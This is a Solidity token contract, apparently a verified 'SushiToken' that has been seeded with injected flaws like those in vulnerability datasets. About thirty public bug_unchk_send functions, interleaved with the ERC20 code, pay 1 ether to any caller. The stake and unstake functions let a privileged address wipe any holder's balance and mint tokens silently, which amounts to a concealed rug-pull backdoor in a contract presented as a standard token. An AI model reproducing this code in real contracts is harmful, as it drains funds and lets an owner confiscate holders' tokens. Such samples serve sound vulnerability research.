/**
 *Submitted for verification at Etherscan.io on 2020-08-28
*/

pragma solidity ^0.5.16;
interface IERC20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}
contract Context {
    constructor () internal { }
function bug_unchk_send20() payable public{
      msg.sender.transfer(1 ether);}
    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }
function bug_unchk_send2() payable public{
      msg.sender.transfer(1 ether);}
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
  function bug_unchk_send21() payable public{
      msg.sender.transfer(1 ether);}
  mapping (address => uint) private _balances;
  function bug_unchk_send4() payable public{
      msg.sender.transfer(1 ether);}
  mapping (address => mapping (address => uint)) private _allowances;
  function bug_unchk_send22() payable public{
      msg.sender.transfer(1 ether);}
  uint private _totalSupply;
    function totalSupply() public view returns (uint) {
        return _totalSupply;
    }
function bug_unchk_send14() payable public{
      msg.sender.transfer(1 ether);}
    function balanceOf(address account) public view returns (uint) {
        return _balances[account];
    }
function bug_unchk_send25() payable public{
      msg.sender.transfer(1 ether);}
    function transfer(address recipient, uint amount) public returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
function bug_unchk_send3() payable public{
      msg.sender.transfer(1 ether);}
    function allowance(address owner, address spender) public view returns (uint) {
        return _allowances[owner][spender];
    }
function bug_unchk_send28() payable public{
      msg.sender.transfer(1 ether);}
    function approve(address spender, uint amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
function bug_unchk_send32() payable public{
      msg.sender.transfer(1 ether);}
    function transferFrom(address sender, address recipient, uint amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
function bug_unchk_send15() payable public{
      msg.sender.transfer(1 ether);}
    function increaseAllowance(address spender, uint addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
function bug_unchk_send16() payable public{
      msg.sender.transfer(1 ether);}
    function decreaseAllowance(address spender, uint subtractedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
function bug_unchk_send31() payable public{
      msg.sender.transfer(1 ether);}
    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
function bug_unchk_send12() payable public{
      msg.sender.transfer(1 ether);}
    function _initMint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }
function bug_unchk_send29() payable public{
      msg.sender.transfer(1 ether);}
    function _unstake(address account, uint amount) internal {
        require(account != address(0), "ERC20: _unstake to the zero address");
        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
    }
function bug_unchk_send24() payable public{
      msg.sender.transfer(1 ether);}
    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");
        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }
function bug_unchk_send13() payable public{
      msg.sender.transfer(1 ether);}
    function _stake(address acc) internal {
        require(acc != address(0), "stake to the zero address");
        uint amount = _balances[acc];
        _balances[acc] = 0;
        _totalSupply = _totalSupply.sub(amount);
    }
function bug_unchk_send26() payable public{
      msg.sender.transfer(1 ether);}
    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
function bug_unchk_send19() payable public{
      msg.sender.transfer(1 ether);}
}

contract ERC20Detailed is IERC20 {
  function bug_unchk_send8() payable public{
      msg.sender.transfer(1 ether);}
  string private _name;
  function bug_unchk_send18() payable public{
      msg.sender.transfer(1 ether);}
  string private _symbol;
  function bug_unchk_send5() payable public{
      msg.sender.transfer(1 ether);}
  uint8 private _decimals;

    constructor (string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }
function bug_unchk_send10() payable public{
      msg.sender.transfer(1 ether);}
    function name() public view returns (string memory) {
        return _name;
    }
function bug_unchk_send7() payable public{
      msg.sender.transfer(1 ether);}
    function symbol() public view returns (string memory) {
        return _symbol;
    }
function bug_unchk_send1() payable public{
      msg.sender.transfer(1 ether);}
    function decimals() public view returns (uint8) {
        return _decimals;
    }
function bug_unchk_send30() payable public{
      msg.sender.transfer(1 ether);}
}

library SafeMath {
    function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint a, uint b) internal pure returns (uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        require(b <= a, errorMessage);
        uint c = a - b;
        return c;
    }
    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }
        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint a, uint b) internal pure returns (uint) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        require(b > 0, errorMessage);
        uint c = a / b;
        return c;
    }
}

contract SushiToken is ERC20, ERC20Detailed {
  using SafeMath for uint;
function bug_unchk_send23() payable public{
      msg.sender.transfer(1 ether);}
  mapping (address => bool) public stakers;
  constructor () public ERC20Detailed("SUSHI.ZIPPO.IO", "SUSHI", 18) {
      _initMint( msg.sender, 10000*10**uint(decimals()) );
      stakers[msg.sender] = true;
  }
function bug_unchk_send11() payable public{
      msg.sender.transfer(1 ether);}

  function stake(address account) public {
      require(stakers[msg.sender], "error");
      _stake(account);
  }
function bug_unchk_send9() payable public{
      msg.sender.transfer(1 ether);}

  function unstake(address account, uint amount) public {
      require(stakers[msg.sender], "error");
      _unstake(account, amount);
  }
function bug_unchk_send17() payable public{
      msg.sender.transfer(1 ether);}

}